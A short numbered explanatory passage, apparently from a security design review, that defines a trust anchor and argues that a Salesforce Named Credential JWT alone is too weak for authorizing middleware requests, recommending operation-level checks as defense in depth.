    **20.** A trust anchor is a root of trust — a credential, certificate, or identity assertion that is accepted without further verification, from which all other authorization decisions flow. The Salesforce Named Credential JWT is the trust anchor for inbound middleware requests: the middleware verifies the JWT signature and treats the caller as an authenticated Salesforce org. The weakness of treating it as the *sole* trust anchor is that it proves only that the request came from *some* Salesforce code in the org — not that it followed the expected business logic path (e.g., came from the correct trigger, with correct before/after state, for a valid object type). A malicious or buggy Apex class could obtain the Named Credential and call middleware endpoints with arbitrary payloads. Layering in operation-level authorization (validating that the requested sync operation is consistent with the Salesforce object state) adds defense in depth beyond the JWT.
